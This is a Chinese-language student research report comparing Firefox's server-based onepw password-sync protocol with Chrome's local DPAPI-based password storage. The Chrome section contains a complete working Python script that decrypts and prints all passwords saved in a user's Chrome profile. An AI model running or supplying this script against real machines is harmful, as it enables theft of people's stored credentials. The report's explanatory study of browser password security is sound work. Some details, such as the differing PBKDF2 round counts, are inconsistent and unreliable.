# 比较Firefox和谷歌的记住密码插件的实现区别

本md文件即为research-report

## 实验目标及方法

实验目标即标题，比较Firefox和Chrom的记住密码插件的实现区别，包括协议和代码上的区别。

实验方法为阅读Firefox和Chrom对于密码管理器的官方文档，同时寻找插件源码予以验证。

为了不引起歧义，下文中我们把用户存储的网站和账户密码称作"口令"。

## Firefox记住密码原理概述（基于onepw的密码存储协议）<sup>[1]</sup>

通过阅读Firefox的Github文档，了解到Firefox利用了本地客户端、密码服务器和一个安全密码查询协议和一个密码验证协议来实现整个功能。

简单而言，客户端存储账户信息和密码（该密码不会发送给密码服务器，否则会使服务器得到所存储密钥加密值的明文），客户端利用密码验证协议证明自己为密码持有者，为自己产生会话令牌，服务器会验证该令牌。服务器会将口令分为A类和B类：

- A类：即使用户忘记了密码，也可以通过证明对电子邮件地址的控制权(ID)并重置帐户来恢复分配给此类的口令。A类主密钥存储在服务器上，用于帮助用户找回丢失口令，不同数据类型的单个加密密钥均派生自 kA。
- B类：如果忘记密码，则无法恢复此类中的数据。即使拥有用户的IdP 无法读取它。密钥服务器只存储 wrap（kB），并且永远不会看到 kB 本身。客户端（浏览器）使用从用户密码派生的密钥（这一步使用了 Key Stretching，得到B类密钥的派生密钥）来解密 wrap（kB），获取真正的 kB。

下面对Firefox插件各步骤的详细分析。

### 创建口令管理帐户并分配密钥

Merkel tree示例如图所示：

![image](https://github.com/xin-li-sdu/Projects-of-CSPIE/blob/main/Project17/picture/1.png)

当用户在客户端输入email和password后，运行100轮派生函数PBKDF2，使用用户的邮件地址作为salt生成quickStretchedPW，然后将其作为HKDF的参数，得到authPW，在此过程中得到了密码强度足够(主要是保证随机性)的派生密钥authPW。最后，将邮件地址和对应的authPW发送给服务器。

服务器得到密钥后，会对该密钥进一步扩展，同时生成哈希表存储索引值便于遍历。

###  口令查询/会话建立

口令查询包括获得会话令牌和创立会话

我们先来谈谈获得会话令牌，主要步骤如下图所示：

![image](https://github.com/xin-li-sdu/Projects-of-CSPIE/blob/main/Project17/picture/2.png)

要将客户端连接到服务器，需要使用登录协议将电子邮件+密码对转换为sessionToken。

该协议首先在客户端将密码和电子邮件地址输入 1000 轮 PBKDF2 以获得quickStretchedPW，将 quickStretchedPW 输入 HKDF 以获得authPW，然后将电子邮件 + authPW 发送到服务器的端点。

服务器使用电子邮件地址查找数据库行，提取authSalt，执行与帐户创建期间相同的拉伸，以获取bigStretchedPW，验证哈希值得到verifyHash，然后将verifyHash与存储的值进行比较。如果它们匹配，则客户端已证明知道密码，服务器将创建一个新会话。服务器将新生成的会话令牌及其帐户标识符 （uid） 返回给客户端。

 值得注意的是，在本协议中，服务器支持每个帐户同时存在多个会话（通常每个客户端设备一个会话，可能还有其他用于帐户管理门户的会话）。这代表sessionToken 永久存在（直到被密码更改或显式吊销命令撤销），并且可以无限次使用。

对于已验证电子邮件地址的帐户(具有会话令牌sessionToken)的客户端可以使用api获取经由签名的浏览器 ID/用户配置证书。然后，可以使用此证书生成已签名的浏览器 ID assertions，传递到服务器的./certificate/sign。过程如下图所示：

![image](https://github.com/xin-li-sdu/Projects-of-CSPIE/blob/main/Project17/picture/3.png)

### 更改/找回密码

当用户更改其密码（即他们仍然知道旧密码）时，或当用户忘记密码时，需要重置账户和密码。下面将分别讨论两者情况：

当需要**利用旧密码重置密码**时，需要完成下图流程：

其主要协议流程为验证用户身份，之后用户使用旧密码将存储在服务器的wrap(kb)解密，然后使用从新密码派生的新密码重新包装kb生成新的wrap(kb)。

![image](https://github.com/xin-li-sdu/Projects-of-CSPIE/blob/main/Project17/picture/4.png)

对于**找回密码**，用户首先需要访问fxa-content-server（即服务器）上的页面，服务器向用户发送一封带有恢复代码的电子邮件，然后在用户单击该电子邮件中的链接，利用存储的邮件地址来验证自己的身份，从而重置密码。

具体而言，当用户申请重置密码，服务器将相应的帐户标记为“待恢复”，为该帐户分配一个随机密码ForgotToken，创建一个恢复代码，并向用户发送电子邮件，其中包含URL（指向fxa-content-server）、passwordForgotToken和恢复代码作为query-args。

当用户单击链接时，加载的 fxa 内容服务器页面会将令牌和代码提交到 API。当服务器看到匹配的令牌和代码时，它会分配一个backtoken并将其返回到提交它们的客户端（页面）。然后，客户端可以创建新的密码并重复创建账户时的密码创建流程，如下图所示：

 ![image](https://github.com/xin-li-sdu/Projects-of-CSPIE/blob/main/Project17/picture/5.png)

值得注意的是，一旦重置密码，将会丢失所有B类数据，这避免盗取邮箱的攻击者获得用户的所有口令，用户只能得到存储的A类数据。

这个设置是必要的，如果B类和A类不分开存储，那么同时也会有攻击服务器的攻击者，一旦得到服务器控制权，就可以解密A类，但是无法解密B类口令。

### 使用的加密手段

本协议使用基于 HKDF 的派生密码用于保护本协议中请求的内容。HKDF 用于创建多个与消息长度相等的随机字节，然后将这些字节与明文进行 XOR 运算以生成密文。然后从密文计算 HMAC，以保护消息的完整性。之所以使用该方案是因为HKDF首先可证明计算安全，其次易于指定且易于实现（只需要实现HMAC和异或操作）。

### 安全性分析

首先，攻击者可以暴力枚举kb，但这意味着他们必须对要测试的每个猜测的密码进行1000轮PBKDF和其他操作，这是计算上困难的。

其次，攻击者通过web漏洞如果控制了服务器（如利用中国蚁剑等webshell工具获得服务器webshell），获得了文件读写权限，那么攻击者也无法解密wrap(kB)。此时A类数据将会被窃取。

第三，即使攻击者利用盗取的邮箱重置用户密码，也无法访问B类数据，B类数据会丢失。此时A类数据将会被窃取。


## Chrome记住密码原理概述<sup>[2]</sup>

Chrome密码管理器与Firfox不同的是，其将密码和加密过的数据均存储在用户本地，以windows为例，Chrome将使用windows API **CryptProtectData** <sup>[3]</sup>加密后的口令存储在AppData\Local\Google\Chrome\User Data\Default\ **Login Data**，将密码存储在AppData\Local\Google\Chrome\User Data\ ***Local State***。

Chromee的立场是主密码提供了一种虚假的安全感，保护敏感数据的最可行保护方式是要取决于系统的整体安全性。所有，为了执行加密（在Windows操作系统上），Chrome使用了Windows提供的CryptProtectData API，该API允许已经用于加密的Windows用户账户去解密已加密的口令。所以也可以理解为主密码就是Windows账户密码，即只要登录了Windows账号，Chrome就可以解密口令，并导入密码管理器中。

下面尝试编写代码chrom.py来调用CryptProtectData API解密密文，

```python
import os,json,base64,sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM 
from win32crypt import CryptUnprotectData

class ChromeATK:
  def __init__(self):
    self.local_state = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State'
    self.cookie_path = os.environ['LOCALAPPDATA'] + r"\Google\Chrome\User Data\Default\Login Data"
 
  def get_key(self):
    with open(self.local_state, 'r', encoding='utf-8') as f:
      base64_encrypted_key = json.load(f)['os_crypt']['encrypted_key']
    encrypted_key_with_header = base64.b64decode(base64_encrypted_key)
    encrypted_key = encrypted_key_with_header[5:]
    key_ = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key_
 
  @staticmethod
  def decrypt_string(key, secret, salt=None): 
    nonce, cipher_bytes = secret[3:15], secret[15:]
    aes_gcm = AESGCM(key)
    return aes_gcm.decrypt(nonce, cipher_bytes, salt).decode('utf-8')
 
  def password(self):
    sql = "select username_value,password_value,signon_realm from logins"
    with sqlite3.connect(self.cookie_path) as conn:
      cu = conn.cursor()
      res = cu.execute(sql).fetchall()
      cu.close()
      result = []
      key = self.get_key()
 
      for name, encrypted_value,website in res: 
        if encrypted_value[0:3] == b'v10' or encrypted_value[0:3] == b'v11':
          passwd = self.decrypt_string(key, encrypted_value)
        else:
          passwd = CryptUnprotectData(encrypted_value)[1].decode()
        print('网站：{}，账户：{}，口令：{}'.format(website,name, passwd))
 
 
if __name__ == '__main__':
  c = ChromeATK()
  c.password()

```

使用了`sqlite3`模块来连接并查询浏览器的登录数据表，然后使用`CryptUnprotectData`函数和`AESGCM`类来解密密码。具体功能包括：

- `get_key`函数用于获取本地状态文件中存储的加密密钥。
- `decrypt_string`函数用于解密加密的字符串。
- `password`函数用于从数据库中获取保存的密码，并根据加密方式进行解密。
- `__main__`中创建了一个`ChromeATK`对象并调用`password`函数来打印出所有密码的相关信息。

可以得到解密后的账户信息：

![image](https://github.com/xin-li-sdu/Projects-of-CSPIE/blob/main/Project17/picture/7.png)

## 两者浏览器记住密码插件的比较

综上所述，可以总结出两者之间的区别：

1. 存储位置：Firefox的密码管理器将密码存储在服务器端，而Chrome的密码管理器将密码和口令加密后的结构都存储在本地。
2. 数据恢复：对于忘记密码的情况，Firefox提供了找回密码的方式，通过验证电子邮件地址和重置密码来重新获得账户访问权限。而Chrome则没有提供找回密码的功能。
3. 安全性：Firefox的密码存储协议支持 A 类和 B 类口令，A 类数据可通过验证电子邮件地址和重置密码方式恢复，B 类数据则无法恢复。Chrome的密码存储方案依赖于操作系统的整体安全性，即主密码就是 Windows 账户密码，只要登录了 Windows 账号，Chrome 就可以解密口令，并导入密码管理器中。

**参考资料：**

【1】 [onepw protocol · mozilla/fxa-auth-server Wiki (github.com)](https://github.com/mozilla/fxa-auth-server/wiki/onepw-protocol)

【2】[How Secure are Your Saved Chrome Browser Passwords? (howtogeek.com)](https://www.howtogeek.com/70146/how-secure-are-your-saved-chrome-browser-passwords/)

【3】[CryptProtectData 函数 (dpapi.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata)


